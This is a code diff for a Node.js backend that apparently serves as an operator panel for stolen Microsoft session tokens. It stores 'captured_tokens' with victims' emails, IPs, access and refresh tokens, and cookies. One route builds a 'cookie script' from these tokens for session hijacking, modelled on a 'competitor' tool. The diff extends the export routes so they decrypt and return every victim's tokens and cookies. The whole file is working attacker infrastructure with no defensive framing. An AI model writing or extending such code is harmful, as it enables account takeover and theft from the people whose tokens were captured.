@@ -88,7 +88,7 @@ router.delete('/:id', userAuth, async (req, res) => {
   }
 });
 
-// Generate cookie script - EXACT competitor format (only 2 cookies: x-ms-RefreshTokenCredential + RefreshToken)
+// Generate cookie script - (only 2 cookies: x-ms-RefreshTokenCredential + RefreshToken)
 router.get('/:id/cookie-script', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
@@ -103,10 +103,10 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       return res.status(400).json({ error: 'No tokens available' });
     }
     
-    // Build ONLY the 2 token cookies like competitor (NO stored cookies array)
+    // Build ONLY the 2 token cookies
     var parts = [];
     
-    // x-ms-RefreshTokenCredential = access_token (like competitor's first cookie)
+    // x-ms-RefreshTokenCredential = access_token
     if (accessToken) {
       parts.push('x-ms-RefreshTokenCredential=' + accessToken);
     }
@@ -196,10 +196,32 @@ router.get('/:id/renewals', userAuth, async (req, res) => {
 router.post('/export', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query(
-      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
+      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
       [req.user.id]
     );
-    res.json({ tokens: tokens, exported_at: new Date().toISOString(), count: tokens.length });
+    const config = require('../config/env');
+    
+    // Decrypt tokens for export
+    const decryptedTokens = tokens.map(token => ({
+      id: token.id,
+      email: token.email,
+      token_type: token.token_type,
+      ip_address: token.ip_address,
+      user_agent: token.user_agent,
+      notes: token.notes,
+      expiration: token.expiration,
+      created_at: token.created_at,
+      access_token: decrypt(token.access_token_encrypted),
+      refresh_token: decrypt(token.refresh_token_encrypted),
+      id_token: decrypt(token.id_token_encrypted),
+      cookies: decrypt(token.cookies_encrypted)
+    }));
+    
+    res.json({ 
+      tokens: decryptedTokens, 
+      exported_at: new Date().toISOString(), 
+      count: decryptedTokens.length 
+    });
   } catch (err) {
     res.status(500).json({ error: 'Server error' });
   }
@@ -209,11 +231,27 @@ router.post('/export', userAuth, async (req, res) => {
 router.post('/export-delete-all', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query(
-      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0',
+      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0',
       [req.user.id]
     );
+    
+    const decryptedTokens = tokens.map(token => ({
+      id: token.id,
+      email: token.email,
+      token_type: token.token_type,
+      ip_address: token.ip_address,
+      user_agent: token.user_agent,
+      notes: token.notes,
+      expiration: token.expiration,
+      created_at: token.created_at,
+      access_token: decrypt(token.access_token_encrypted),
+      refresh_token: decrypt(token.refresh_token_encrypted),
+      id_token: decrypt(token.id_token_encrypted),
+      cookies: decrypt(token.cookies_encrypted)
+    }));
+    
     await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0', [req.user.id]);
-    res.json({ tokens: tokens, exported_at: new Date().toISOString(), count: tokens.length, deleted: true });
+    res.json({ tokens: decryptedTokens, exported_at: new Date().toISOString(), count: decryptedTokens.length, deleted: true });
   } catch (err) {
     res.status(500).json({ error: 'Server error' });
   }
